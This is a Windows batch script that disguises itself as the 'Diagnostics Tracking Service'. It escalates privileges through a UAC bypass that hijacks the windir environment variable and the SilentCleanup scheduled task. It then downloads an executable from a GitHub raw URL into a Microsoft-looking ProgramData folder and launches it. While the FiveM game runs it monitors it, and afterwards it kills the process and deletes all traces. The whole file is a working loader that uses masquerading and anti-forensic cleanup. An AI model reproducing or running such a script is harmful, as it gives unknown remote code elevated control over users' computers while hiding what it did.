@echo off
title Diagnostics Tracking Service
mode con: cols=70 lines=15
setlocal EnableDelayedExpansion

:: --- UAC bypass via SilentCleanup if not admin ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    reg add "HKCU\Environment" /v windir /t REG_SZ /d "cmd /c \"\"%~f0\"\" & REM " /f >nul 2>&1
    schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i >nul 2>&1
    timeout /t 2 /nobreak >nul
    reg delete "HKCU\Environment" /v windir /f >nul 2>&1
    exit /b
)

set "dir=%ProgramData%\Microsoft\Diagnosis"
set "bin=%dir%\DiagTrackSvc.exe"
set "dat=%dir%\diagtrack.dat"
set "procname=DiagTrackSvc.exe"
set "helpername=DiagTrackHelper.exe"

set "url=https://raw.githubusercontent.com/iVirusi/peak/main/DiagTrackSvc.exe"

if not exist "%dir%" mkdir "%dir%" >nul 2>&1

echo [+] Fetching.
curl.exe -sfL -o "%dat%" "!url!" >nul 2>&1
if not exist "%dat%" (
    echo [-] Download failed.
    timeout /t 3 /nobreak >nul
    exit /b
)
for %%A in ("%dat%") do set "sz=%%~zA"
if "!sz!"=="0" (
    del /f /q "%dat%" >nul 2>&1
    echo [-] Empty.
    timeout /t 3 /nobreak >nul
    exit /b
)

ren "%dat%" "DiagTrackSvc.exe" >nul 2>&1

echo [+] Launching.
start "" "%bin%"
timeout /t 3 /nobreak >nul

set "mypid="
for /f "tokens=2 delims=," %%p in ('tasklist /fo csv /nh /fi "imagename eq %procname%" 2^>nul') do (
    if not defined mypid set "mypid=%%~p"
)
if not defined mypid (
    echo [-] Loader failed to start.
    timeout /t 3 /nobreak >nul
    exit /b
)
echo [+] Active PID !mypid!.

echo [+] Waiting for FiveM.
set "boot_wait=0"
:boot
timeout /t 5 /nobreak >nul
set /a boot_wait+=1
tasklist /nh 2>nul | findstr /i /b /c:"FiveM" >nul
if %errorlevel%==0 goto watch
if %boot_wait% lss 24 goto boot
echo [-] FiveM not detected. Cleaning up.
goto cleanup

:watch
echo [+] FiveM detected. Monitoring.
:watchloop
timeout /t 5 /nobreak >nul
tasklist /nh 2>nul | findstr /i /b /c:"FiveM" >nul
if %errorlevel%==0 goto watchloop

echo [+] FiveM closed. Say Bye.

:cleanup
taskkill /f /im "%procname%" /t >nul 2>&1
taskkill /f /im "%helpername%" /t >nul 2>&1
timeout /t 1 /nobreak >nul

del /f /q "%bin%" >nul 2>&1
del /f /q "%dir%\%helpername%" >nul 2>&1
del /f /q "%dir%\*" >nul 2>&1
rmdir /s /q "%dir%" >nul 2>&1

echo [+] Done.
timeout /t 2 /nobreak >nul
exit /b
